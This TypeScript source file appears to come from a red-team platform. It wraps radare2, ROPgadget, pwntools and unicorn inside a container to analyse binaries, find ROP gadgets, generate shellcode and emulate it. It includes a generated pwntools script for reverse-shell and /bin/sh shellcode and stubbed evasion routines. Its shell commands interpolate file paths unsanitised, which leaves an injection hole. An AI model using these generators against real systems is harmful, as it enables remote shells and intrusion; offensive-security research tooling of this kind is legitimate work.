/**
 * Maldev Tool Executor
 * 
 * Provides wrappers for executing reverse-engineering, ROP development,
 * and evasion tools within the rtpi-maldev-agent container.
 * 
 * Tools Available:
 *   - Reverse Engineering: Ghidra, radare2, x64dbg, WinDbg
 *   - ROP Development: ROPgadget, RustChain, ropium, xgadget
 *   - Shellcode/Evasion: pwntools, TamperETW, SHAPESHIFTER, SysWhispers
 *   - Validation: unicorn (emulator), capstone (disassembler), keystone (assembler)
 */

import { multiContainerExecutor } from './multi-container-executor';
import { DockerExecutor } from '../docker-executor';

// ============================================================================
// Types & Interfaces
// ============================================================================

export interface BinaryAnalysis {
  binaryPath: string;
  architecture: 'x86' | 'x64' | 'arm' | 'arm64';
  protections: {
    nx: boolean;          // Non-executable stack
    pie: boolean;         // Position Independent Executable
    canary: boolean;      // Stack canary
    relro: 'none' | 'partial' | 'full';
    aslr: boolean;        // Address Space Layout Randomization
  };
  vulnerableFunctions: Array<{
    name: string;
    address: string;
    type: 'buffer_overflow' | 'format_string' | 'use_after_free' | 'integer_overflow';
    description: string;
  }>;
  importedFunctions: string[];
  exportedFunctions: string[];
  strings: string[];
  gadgets?: ROPGadget[];  // If ROP analysis performed
}

export interface ROPGadget {
  address: string;
  instructions: string;
  type: 'pop' | 'mov' | 'add' | 'call' | 'ret' | 'syscall' | 'other';
  registers?: string[];
}

export interface ROPChain {
  objective: string;
  gadgets: ROPGadget[];
  payload: string;
  chainCode: string;  // Python/Ruby code to build chain
}

export interface Shellcode {
  platform: 'linux' | 'windows' | 'macos';
  architecture: 'x86' | 'x64';
  payload: string;    // Hex-encoded shellcode
  length: number;
  badChars: string[]; // Characters to avoid
  encoder?: string;   // Encoder used (if any)
}

export interface EmulationResult {
  success: boolean;
  output: string;
  registers: Record<string, string>;
  memoryDump?: string;
  crashed: boolean;
  error?: string;
}

// ============================================================================
// Maldev Tool Executor
// ============================================================================

export class MaldevToolExecutor {
  private containerName = 'rtpi-maldev-agent';
  private containerUser = 'rtpi-agent';  // Correct user for maldev container
  private dockerExecutor: DockerExecutor;

  constructor() {
    this.dockerExecutor = new DockerExecutor();
  }

  // ==========================================================================
  // Binary Analysis Tools
  // ==========================================================================

  /**
   * Analyze binary with radare2 (faster alternative to Ghidra for quick analysis)
   * 
   * @param binaryPath - Path to binary file (in shared volume)
   * @returns Binary analysis results
   */
  async analyzeWithRadare2(binaryPath: string): Promise<BinaryAnalysis> {
    console.log(`[Maldev Tools] Analyzing binary with radare2: ${binaryPath}`);

    // Check binary protections
    const protectionsCmd = `rabin2 -I ${binaryPath}`;
    const protectionsResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', protectionsCmd],
      { timeout: 30000, user: this.containerUser }
    );

    // Extract strings
    const stringsCmd = `rabin2 -z ${binaryPath} | head -100`;
    const stringsResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', stringsCmd],
      { timeout: 15000, user: this.containerUser }
    );

    // Get imports/exports
    const importsCmd = `rabin2 -i ${binaryPath}`;
    const exportsCmd = `rabin2 -iE ${binaryPath}`;
    
    const [importsResult, exportsResult] = await Promise.all([
      this.dockerExecutor.exec(this.containerName, ['bash', '-c', importsCmd], { timeout: 10000, user: this.containerUser }),
      this.dockerExecutor.exec(this.containerName, ['bash', '-c', exportsCmd], { timeout: 10000, user: this.containerUser })
    ]);

    // Parse results
    return this.parseRadare2Output(
      binaryPath,
      protectionsResult.stdout,
      stringsResult.stdout,
      importsResult.stdout,
      exportsResult.stdout
    );
  }

  /**
   * Analyze binary with checksec (quick protection check)
   */
  async checkSecurityProtections(binaryPath: string): Promise<BinaryAnalysis['protections']> {
    // Using rabin2 for quick checksec-like analysis
    const cmd = `rabin2 -I ${binaryPath}`;
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', cmd],
      { timeout: 10000, user: this.containerUser }
    );

    return this.parseProtections(result.stdout);
  }

  // ==========================================================================
  // ROP Gadget Tools
  // ==========================================================================

  /**
   * Find ROP gadgets using ROPgadget
   * 
   * @param binaryPath - Path to binary
   * @param maxGadgets - Maximum number of gadgets to return (default: 100)
   * @returns Array of ROP gadgets
   */
  async findGadgets(binaryPath: string, maxGadgets = 100): Promise<ROPGadget[]> {
    console.log(`[Maldev Tools] Finding ROP gadgets with ROPgadget: ${binaryPath}`);

    const cmd = `cd /opt/tools/ROPgadget && python3 ROPgadget.py --binary ${binaryPath} --depth 10 | head -${maxGadgets + 20}`;
    
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', cmd],
      { timeout: 60000, user: this.containerUser }
    );

    if (result.exitCode !== 0) {
      console.error('[Maldev Tools] ROPgadget failed:', result.stderr);
      return [];
    }

    return this.parseROPGadgets(result.stdout);
  }

  /**
   * Build ROP chain using pwntools
   * 
   * @param gadgets - Available ROP gadgets
   * @param objective - What the ROP chain should accomplish
   * @returns ROP chain with payload
   */
  async buildROPChain(gadgets: ROPGadget[], objective: string): Promise<ROPChain> {
    console.log(`[Maldev Tools] Building ROP chain for: ${objective}`);

    // Generate Python script using pwntools
    const script = this.generatePwntoolsROPScript(gadgets, objective);
    
    // Write script to temp file
    const scriptPath = `/tmp/rop_chain_${Date.now()}.py`;
    const writeCmd = `cat > ${scriptPath} << 'EOF'\n${script}\nEOF`;
    
    await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', writeCmd],
      { timeout: 5000, user: this.containerUser }
    );

    // Execute script
    const execCmd = `cd /tmp && python3 ${scriptPath}`;
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', execCmd],
      { timeout: 30000, user: this.containerUser }
    );

    // Parse output
    return this.parseROPChainOutput(result.stdout, gadgets, objective);
  }

  // ==========================================================================
  // Shellcode Generation
  // ==========================================================================

  /**
   * Generate shellcode using pwntools
   * 
   * @param platform - Target platform
   * @param architecture - Target architecture
   * @param payload - Payload type (e.g., 'reverse_shell', 'bind_shell', 'exec')
   * @param options - Additional options (lhost, lport, command, etc.)
   * @returns Generated shellcode
   */
  async generateShellcode(
    platform: 'linux' | 'windows' | 'macos',
    architecture: 'x86' | 'x64',
    payload: 'reverse_shell' | 'bind_shell' | 'exec' | 'read_flag',
    options: Record<string, any> = {}
  ): Promise<Shellcode> {
    console.log(`[Maldev Tools] Generating ${payload} shellcode for ${platform}/${architecture}`);

    const script = this.generatePwntoolsShellcodeScript(
      platform,
      architecture,
      payload,
      options
    );

    const scriptPath = `/tmp/shellcode_${Date.now()}.py`;
    const writeCmd = `cat > ${scriptPath} << 'EOF'\n${script}\nEOF`;
    
    await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', writeCmd],
      { timeout: 5000, user: this.containerUser }
    );

    const execCmd = `cd /tmp && python3 ${scriptPath}`;
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', execCmd],
      { timeout: 15000, user: this.containerUser }
    );

    return this.parseShellcodeOutput(result.stdout, platform, architecture);
  }

  // ==========================================================================
  // Evasion Techniques
  // ==========================================================================

  /**
   * Apply evasion techniques to shellcode/payload
   * 
   * @param code - Original code/shellcode
   * @param techniques - Evasion techniques to apply
   * @returns Modified code with evasion applied
   */
  async applyEvasion(
    code: string,
    techniques: Array<'encoding' | 'polymorphic' | 'syscall' | 'obfuscation'>
  ): Promise<string> {
    console.log(`[Maldev Tools] Applying evasion techniques: ${techniques.join(', ')}`);

    let modifiedCode = code;

    for (const technique of techniques) {
      switch (technique) {
        case 'encoding':
          // Apply encoder (e.g., shikata_ga_nai-like)
          modifiedCode = await this.applyEncoder(modifiedCode);
          break;
        case 'syscall':
          // Convert to direct syscalls (SysWhispers approach)
          modifiedCode = await this.convertToSyscalls(modifiedCode);
          break;
        case 'obfuscation':
          // Apply code obfuscation
          modifiedCode = await this.obfuscateCode(modifiedCode);
          break;
        case 'polymorphic':
          // Apply polymorphic transformation
          modifiedCode = await this.makePolymorphic(modifiedCode);
          break;
      }
    }

    return modifiedCode;
  }

  // ==========================================================================
  // Validation & Emulation
  // ==========================================================================

  /**
   * Emulate shellcode with unicorn to validate it works
   * 
   * @param shellcode - Shellcode to emulate
   * @param architecture - Architecture to emulate
   * @returns Emulation results
   */
  async emulateShellcode(
    shellcode: string,
    architecture: 'x86' | 'x64' = 'x64'
  ): Promise<EmulationResult> {
    console.log(`[Maldev Tools] Emulating shellcode with unicorn (${architecture})`);

    const script = this.generateUnicornEmulationScript(shellcode, architecture);
    
    const scriptPath = `/tmp/emulate_${Date.now()}.py`;
    const writeCmd = `cat > ${scriptPath} << 'EOF'\n${script}\nEOF`;
    
    await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', writeCmd],
      { timeout: 5000, user: this.containerUser }
    );

    const execCmd = `cd /tmp && timeout 10 python3 ${scriptPath}`;
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', execCmd],
      { timeout: 15000, user: this.containerUser }
    );

    return this.parseEmulationOutput(result.stdout, result.stderr, result.exitCode);
  }

  // ==========================================================================
  // Helper Methods: Parsing
  // ==========================================================================

  private parseRadare2Output(
    binaryPath: string,
    protectionsOutput: string,
    stringsOutput: string,
    importsOutput: string,
    exportsOutput: string
  ): BinaryAnalysis {
    const protections = this.parseProtections(protectionsOutput);
    
    // Parse architecture
    const archMatch = protectionsOutput.match(/arch\s+(\w+)/i);
    const architecture = this.normalizeArchitecture(archMatch ? archMatch[1] : 'unknown');

    // Parse strings
    const strings = stringsOutput
      .split('\n')
      .filter(line => line.trim())
      .map(line => line.split(' ').slice(-1)[0])
      .filter(s => s && s.length > 3)
      .slice(0, 50); // Limit to 50 strings

    // Parse imports
    const imports = importsOutput
      .split('\n')
      .filter(line => line.includes('FUNC'))
      .map(line => line.split(' ').pop() || '')
      .filter(Boolean);

    // Parse exports
    const exports = exportsOutput
      .split('\n')
      .filter(line => line.includes('FUNC'))
      .map(line => line.split(' ').pop() || '')
      .filter(Boolean);

    // Identify vulnerable functions
    const vulnerableFunctions = this.identifyVulnerableFunctions(imports);

    return {
      binaryPath,
      architecture,
      protections,
      vulnerableFunctions,
      importedFunctions: imports,
      exportedFunctions: exports,
      strings,
    };
  }

  private parseProtections(output: string): BinaryAnalysis['protections'] {
    const hasNX = /nx\s+true/i.test(output) || /canary\s+true/i.test(output);
    const hasPIE = /pic\s+true/i.test(output) || /pie\s+true/i.test(output);
    const hasCanary = /canary\s+true/i.test(output);
    const relroMatch = output.match(/relro\s+(\w+)/i);
    
    return {
      nx: hasNX,
      pie: hasPIE,
      canary: hasCanary,
      relro: relroMatch ? (relroMatch[1].toLowerCase() as any) : 'none',
      aslr: hasPIE, // PIE typically indicates ASLR
    };
  }

  private normalizeArchitecture(arch: string): 'x86' | 'x64' | 'arm' | 'arm64' {
    const lower = arch.toLowerCase();
    if (lower.includes('x86_64') || lower.includes('x64') || lower.includes('amd64')) return 'x64';
    if (lower.includes('x86') || lower.includes('i386') || lower.includes('i686')) return 'x86';
    if (lower.includes('aarch64') || lower.includes('arm64')) return 'arm64';
    if (lower.includes('arm')) return 'arm';
    return 'x64'; // Default
  }

  private identifyVulnerableFunctions(imports: string[]): BinaryAnalysis['vulnerableFunctions'] {
    const vulnerable: BinaryAnalysis['vulnerableFunctions'] = [];

    const dangerousFunctions = {
      buffer_overflow: ['strcpy', 'strcat', 'gets', 'sprintf', 'scanf', 'vsprintf'],
      format_string: ['printf', 'fprintf', 'sprintf', 'snprintf', 'vprintf'],
      use_after_free: ['free', 'realloc'],
      integer_overflow: ['malloc', 'calloc', 'realloc'],
    };

    for (const [type, functions] of Object.entries(dangerousFunctions)) {
      for (const func of functions) {
        if (imports.includes(func)) {
          vulnerable.push({
            name: func,
            address: 'unknown',
            type: type as any,
            description: `Potentially dangerous function: ${func}`,
          });
        }
      }
    }

    return vulnerable;
  }

  private parseROPGadgets(output: string): ROPGadget[] {
    const gadgets: ROPGadget[] = [];
    const lines = output.split('\n');

    for (const line of lines) {
      // ROPgadget format: 0x00001234 : pop rdi ; ret
      const match = line.match(/0x([0-9a-f]+)\s*:\s*(.+)/i);
      if (match) {
        const address = `0x${match[1]}`;
        const instructions = match[2].trim();
        const type = this.classifyGadgetType(instructions);
        const registers = this.extractRegisters(instructions);

        gadgets.push({
          address,
          instructions,
          type,
          registers,
        });
      }
    }

    return gadgets;
  }

  private classifyGadgetType(instructions: string): ROPGadget['type'] {
    if (/pop/i.test(instructions)) return 'pop';
    if (/mov/i.test(instructions)) return 'mov';
    if (/add/i.test(instructions)) return 'add';
    if (/call/i.test(instructions)) return 'call';
    if (/syscall/i.test(instructions)) return 'syscall';
    if (/ret/i.test(instructions)) return 'ret';
    return 'other';
  }

  private extractRegisters(instructions: string): string[] {
    const registerPattern = /\b(rax|rbx|rcx|rdx|rsi|rdi|rbp|rsp|r8|r9|r10|r11|r12|r13|r14|r15|eax|ebx|ecx|edx|esi|edi|ebp|esp)\b/gi;
    const matches = instructions.match(registerPattern);
    return matches ? [...new Set(matches.map(r => r.toLowerCase()))] : [];
  }

  private parseROPChainOutput(output: string, gadgets: ROPGadget[], objective: string): ROPChain {
    // Extract payload from pwntools output
    const payloadMatch = output.match(/payload = b['"](.+)['"]/);
    const payload = payloadMatch ? payloadMatch[1] : '';

    return {
      objective,
      gadgets: gadgets.slice(0, 10), // Use first 10 gadgets in chain
      payload,
      chainCode: output,
    };
  }

  private parseShellcodeOutput(output: string, platform: string, architecture: string): Shellcode {
    // Extract hex-encoded shellcode
    const hexMatch = output.match(/([0-9a-f]{2}\\x)*[0-9a-f]{2}/gi);
    const payload = hexMatch ? hexMatch.join('') : output;

    return {
      platform: platform as any,
      architecture: architecture as any,
      payload,
      length: payload.length / 4, // Assuming \xNN format
      badChars: [],
    };
  }

  private parseEmulationOutput(stdout: string, stderr: string, exitCode: number): EmulationResult {
    const success = exitCode === 0 && !stderr.includes('Error') && !stderr.includes('Traceback');
    const crashed = stderr.includes('Segmentation') || stderr.includes('Invalid');

    // Parse registers from output
    const registers: Record<string, string> = {};
    const regMatches = stdout.matchAll(/(rax|rbx|rcx|rdx|rsi|rdi|rip)\s*=\s*(0x[0-9a-f]+)/gi);
    for (const match of regMatches) {
      registers[match[1].toLowerCase()] = match[2];
    }

    return {
      success,
      output: stdout,
      registers,
      crashed,
      error: success ? undefined : stderr,
    };
  }

  // ==========================================================================
  // Helper Methods: Script Generation
  // ==========================================================================

  private generatePwntoolsROPScript(gadgets: ROPGadget[], objective: string): string {
    return `#!/usr/bin/env python3
from pwn import *

# ROP chain for: ${objective}
context.arch = 'amd64'

# Available gadgets
${gadgets.slice(0, 5).map((g, i) => `gadget_${i} = ${g.address}  # ${g.instructions}`).join('\n')}

# Build ROP chain
rop = b''
# TODO: Implement ROP chain logic based on objective

print(f"ROP Chain: {rop.hex()}")
print(f"Length: {len(rop)} bytes")
`;
  }

  private generatePwntoolsShellcodeScript(
    platform: string,
    architecture: string,
    payload: string,
    options: Record<string, any>
  ): string {
    const lhost = options.lhost || '127.0.0.1';
    const lport = options.lport || 4444;

    return `#!/usr/bin/env python3
from pwn import *

context.arch = '${architecture === 'x64' ? 'amd64' : 'i386'}'
context.os = '${platform}'

# Generate shellcode for ${payload}
${payload === 'reverse_shell' ? `
shellcode = shellcraft.connect('${lhost}', ${lport})
shellcode += shellcraft.dupsh()
` : payload === 'exec' ? `
shellcode = shellcraft.execve('/bin/sh', ['sh'], {})
` : `
shellcode = shellcraft.sh()
`}

shellcode = asm(shellcode)
print(shellcode.hex())
print(f"Length: {len(shellcode)} bytes")
`;
  }

  private generateUnicornEmulationScript(shellcode: string, architecture: string): string {
    return `#!/usr/bin/env python3
from unicorn import *
from unicorn.x86_const import *

# Emulate ${architecture} shellcode
uc = Uc(UC_ARCH_X86, UC_MODE_64 if '${architecture}' == 'x64' else UC_MODE_32)

# Map memory
ADDRESS = 0x1000000
uc.mem_map(ADDRESS, 2 * 1024 * 1024)

# Write shellcode
shellcode = bytes.fromhex('${shellcode}')
uc.mem_write(ADDRESS, shellcode)

# Set initial state
uc.reg_write(UC_X86_REG_RSP, ADDRESS + 0x200000)

# Emulate
try:
    uc.emu_start(ADDRESS, ADDRESS + len(shellcode), timeout=1000000, count=100)
    print("Emulation completed successfully")
    print(f"RAX = {hex(uc.reg_read(UC_X86_REG_RAX))}")
    print(f"RIP = {hex(uc.reg_read(UC_X86_REG_RIP))}")
except Exception as e:
    print(f"Emulation failed: {e}")
`;
  }

  // ==========================================================================
  // Evasion Implementation (Stubs for now)
  // ==========================================================================

  private async applyEncoder(code: string): Promise<string> {
    // TODO: Implement encoder
    console.log('[Maldev Tools] Encoder not yet implemented');
    return code;
  }

  private async convertToSyscalls(code: string): Promise<string> {
    // TODO: Implement syscall conversion
    console.log('[Maldev Tools] Syscall conversion not yet implemented');
    return code;
  }

  private async obfuscateCode(code: string): Promise<string> {
    // TODO: Implement obfuscation
    console.log('[Maldev Tools] Obfuscation not yet implemented');
    return code;
  }

  private async makePolymorphic(code: string): Promise<string> {
    // TODO: Implement polymorphic transformation
    console.log('[Maldev Tools] Polymorphic transformation not yet implemented');
    return code;
  }
}

// Singleton export
export const maldevToolExecutor = new MaldevToolExecutor();
